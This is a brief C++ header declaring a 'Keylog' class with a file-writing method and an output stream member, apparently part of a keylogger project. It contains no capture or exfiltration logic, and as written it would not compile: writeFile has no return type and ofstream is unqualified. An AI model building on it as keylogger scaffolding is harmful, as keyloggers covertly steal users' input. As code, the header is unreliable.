#ifndef _KEYLOG_HH_
#define _KEYLOG_HH_

class Keylog
{
	public:
		Keylog(std::string file);
		~Keylog();
		writeFile(std::string data);

	private:
		ofstream file;
};

#endif